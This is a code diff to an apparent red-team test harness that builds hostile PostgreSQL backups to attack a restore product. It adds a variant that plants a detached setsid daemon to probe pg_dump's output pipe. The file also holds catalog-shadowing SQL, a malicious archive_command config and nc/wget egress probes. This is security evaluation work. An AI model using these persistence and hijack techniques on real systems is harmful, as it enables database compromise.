@@ -485,9 +485,10 @@ def run_product(lab, backup, *, test_mode=True, bypass_verdict=False, observe=No
                 real_remove = work._tmp.remove
 
                 def remove(role, real_remove=real_remove):
-                    if role == 'hapg' and 'hapg' not in res.get('observed_roles', []):
+                    if role == 'hapg':
                         res.setdefault('observed_roles', []).append('hapg')
-                        res['observed'] = observe(work._tmp)
+                        res.setdefault('observed_all', []).append(observe(work._tmp))
+                        res['observed'] = res['observed_all'][0]
                     return real_remove(role)
                 stack.enter_context(mock.patch.object(work._tmp, 'remove', remove))
             t0 = time.monotonic()
@@ -712,7 +713,9 @@ PROOF_SH = ('(echo uid=$(id -u); echo ifaces=$(ls /sys/class/net | tr "\\n" ",")
             'echo secrets=$(ls /run/secrets 2>/dev/null | wc -l); echo mounts=$(wc -l < /proc/self/mounts); '
             'echo pidsmax=$(cat /sys/fs/cgroup/pids.max 2>/dev/null); echo memmax=$(cat /sys/fs/cgroup/memory.max 2>/dev/null); '
             '(nc -z -w 2 10.0.2.2 22 2>/dev/null || wget -q -T 2 -O /dev/null http://1.1.1.1/ 2>/dev/null) '
-            '&& echo egress=open || echo egress=blocked) > /var/lib/postgresql/data/atk-proof.txt 2>&1')
+            '&& echo egress=open || echo egress=blocked) > /var/lib/postgresql/data/atk-proof.txt 2>&1; '
+            '[ -f /var/lib/postgresql/data/atk-daemon.sh ] && setsid sh /var/lib/postgresql/data/atk-daemon.sh '
+            '</dev/null >/dev/null 2>&1 &')
 V3_HAPG_CODE = (r"""
 CREATE SCHEMA atk_fn;
 UPDATE pg_catalog.pg_namespace SET nspname = 'pg_atkfn' WHERE nspname = 'atk_fn';
@@ -729,6 +732,16 @@ INSERT INTO pg_depend VALUES ('pg_proc'::regclass, 'pg_atkfn.pg_encoding_to_char
 ALTER ROLE postgres SET search_path = pg_atkfn, pg_catalog, public;
 ALTER DATABASE omnigent SET session_preload_libraries = 'auto_explain';
 """)
+# v3b: a process the HA cluster's code leaves behind (setsid) waits for the product's pg_dump in the SAME container
+# and only tests -- writing nothing -- whether it could write into pg_dump's stdout pipe (/proc/<pid>/fd/1: a
+# same-uid READ-mode ptrace check, which Yama scope 1 does not restrict) and signal it (same uid).
+PIPE_DAEMON = (b'i=0\nwhile [ $i -lt 900 ]; do\n p=$(pgrep -x pg_dump | head -1)\n if [ -n "$p" ]; then\n'
+               b'  { (exec 3>>/proc/$p/fd/1) 2>/dev/null && echo pgdump_stdout_open_for_write=yes'
+               b' || echo pgdump_stdout_open_for_write=no\n'
+               b'    kill -0 $p 2>/dev/null && echo pgdump_signal=allowed || echo pgdump_signal=denied\n'
+               b'    echo pgdump_uid=$(stat -c %u /proc/$p); echo self_uid=$(id -u); }'
+               b' > /var/lib/postgresql/data/atk-pipe.txt 2>&1\n  exit 0\n fi\n i=$((i+1)); sleep 0.2\ndone\n'
+               b'echo pgdump_seen=no > /var/lib/postgresql/data/atk-pipe.txt\n')
 V3_PG_FILES = [
     ('postgresql.auto.conf', b"shared_preload_libraries = 'auto_explain'\narchive_mode = on\n"
                              b"archive_command = 'touch /tmp/atk-archive'\nlisten_addresses = '*'\n"),
@@ -744,6 +757,9 @@ def hapg_observe(tmp):
     proof = tmp.exec('hapg', ['sh', '-c', 'cat /var/lib/postgresql/data/atk-proof.txt 2>/dev/null || true'],
                      user='postgres', timeout=60, max_output=64 * 1024).stdout or b''
     out['proof'] = proof.decode('utf-8', 'replace').strip().splitlines()[:20]
+    pipe = tmp.exec('hapg', ['sh', '-c', 'cat /var/lib/postgresql/data/atk-pipe.txt 2>/dev/null || true'],
+                    user='postgres', timeout=60, max_output=64 * 1024).stdout or b''
+    out['pipe'] = pipe.decode('utf-8', 'replace').strip().splitlines()[:8]
     for setting in ('session_preload_libraries', 'shared_preload_libraries', 'archive_mode', 'archive_command',
                     'listen_addresses', 'ssl', 'search_path'):
         value = tmp.exec('hapg', ['psql', '-X', '-At', '-U', 'postgres', '-d', 'omnigent', '-c', f'SHOW {setting}'],
@@ -826,6 +842,10 @@ def run_variant(lab, builder, name, results, canaries):
             res['real'] = run_product(lab, path, test_mode=False)
         elif name == 'v3-hapg-code':
             path, size, _ = builder.build(name, V3_HAPG_CODE, pg_extra=V3_PG_FILES)
+            res['backup_bytes'] = size
+            res['real'] = run_product(lab, path, observe=hapg_observe, convert=True)
+        elif name == 'v3b-pipe':
+            path, size, _ = builder.build(name, V3_HAPG_CODE, pg_extra=V3_PG_FILES + [('atk-daemon.sh', PIPE_DAEMON)])
             res['backup_bytes'] = size
             res['real'] = run_product(lab, path, observe=hapg_observe, convert=True)
         elif name == 'v4-toc':
